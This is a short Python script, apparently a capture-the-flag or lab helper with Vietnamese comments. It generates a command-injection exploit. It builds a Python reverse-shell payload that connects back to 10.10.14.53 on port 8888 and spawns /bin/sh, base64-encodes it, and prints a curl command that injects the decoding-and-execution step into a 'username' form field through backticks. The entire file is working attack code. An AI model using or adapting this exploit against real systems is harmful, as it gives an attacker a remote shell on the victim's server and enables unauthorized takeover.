import base64

my_ip = "1.2.3.4"
my_port = 8888
target_url = "http://example.com"  # Thay thế "http://example.com" bằng URL thực tế của bạn

payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.53", 8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
encoded_payload = base64.b64encode(payload.encode()).decode()  # Encode the payload in Base64

# Tạo câu lệnh curl hoàn chỉnh
command = f"curl '{target_url}' --data 'username=;`echo \"{encoded_payload}\" | base64 -d | sh`'"

print(command)